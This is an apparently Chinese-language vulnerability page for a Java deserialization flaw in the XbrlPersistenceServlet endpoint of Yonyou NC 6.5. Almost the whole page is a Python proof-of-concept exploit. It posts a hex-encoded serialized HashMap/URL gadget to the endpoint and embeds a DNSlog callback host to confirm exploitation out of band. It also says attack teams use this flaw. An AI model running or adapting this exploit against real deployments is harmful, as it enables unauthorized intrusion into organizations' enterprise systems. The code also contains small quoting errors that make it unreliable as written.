        <h1 id="用友-NC-XbrlPersistenceServlet反序列化"><a href="#用友-NC-XbrlPersistenceServlet反序列化" class="headerlink" title="用友 NC XbrlPersistenceServlet反序列化"></a>用友 NC XbrlPersistenceServlet反序列化</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>用友 NC XbrlPersistenceServlet反序列化漏洞</p>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">攻击队利用用友nc反序列利用</span><br><span class="line">目前测试影响版本：nc6.5</span><br><span class="line">漏洞url为：</span><br><span class="line">/service/~xbrl/XbrlPersistenceServlet</span><br><span class="line">poc：</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import threadpool</span><br><span class="line">import urllib3</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">ip = &quot;&quot;</span><br><span class="line">dnslog = &quot;\x79\x37\x64\x70\&quot; #dnslog把字符串转16进制替换该段，测试用的ceye.io可以回显</span><br><span class="line">data = &quot;\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x01\x73\x72\x00\x0c\x6a\x61\x76\x61\x2e\x6e\x65\x74\x2e\x55\x52\x4c\x96\x25\x37\x36\x1a\xfc\xe4\x72\x03\x00\x07\x49\x00\x08\x68\x61\x73\x68\x43\x6f\x64\x65\x49\x00\x04\x70\x6f\x72\x74\x4c\x00\x09\x61\x75\x74\x68\x6f\x72\x69\x74\x79\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x4c\x00\x04\x66\x69\x6c\x65\x71\x00\x7e\x00\x03\x4c\x00\x04\x68\x6f\x73\x74\x71\x00\x7e\x00\x03\x4c\x00\x08\x70\x72\x6f\x74\x6f\x63\x6f\x6c\x71\x00\x7e\x00\x03\x4c\x00\x03\x72\x65\x66\x71\x00\x7e\x00\x03\x78\x70\xff\xff\xff\xff\x00\x00\x00\x50\x74\x00\x11&quot;+dnslog+&quot;\x3a\x38\x30\x74\x00\x00\x74\x00\x0e&quot;+dnslog+&quot;\x74\x00\x04\x68\x74\x74\x70\x70\x78\x74\x00\x18\x68\x74\x74\x70\x3a\x2f\x2f&quot;+dnslog+&quot;\x3a\x38\x30\x78&quot;</span><br><span class="line"></span><br><span class="line">uploadHeader=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36&quot;&#125;</span><br><span class="line">req = requests.post(&quot;http://+&quot;ip&quot;+/service/~xbrl/XbrlPersistenceServlet&quot;, headers=uploadHeader, verify=False, data=data, timeout=25)</span><br><span class="line">print (req.text)</span><br></pre></td></tr></table></figure>
